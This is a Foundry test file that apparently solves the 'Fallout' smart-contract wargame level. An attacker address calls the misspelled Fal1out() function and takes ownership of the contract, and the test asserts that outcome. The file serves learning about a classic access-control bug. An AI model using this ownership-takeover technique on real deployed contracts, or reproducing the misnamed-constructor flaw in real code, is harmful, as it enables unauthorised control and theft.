// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/02_Fallout.sol";

contract FalloutTest is Test {
    address private owner = makeAddr("owner");
    Fallout private fallout;

    function setUp() public {
        fallout = new Fallout();
    }

    function test_FalloutExploitVulnerability() public {
        address attacker = makeAddr("attacker");

        vm.prank(attacker);
        fallout.Fal1out();

        assertEq(fallout.owner(), attacker, "Attacker should be the owner");
    }
}
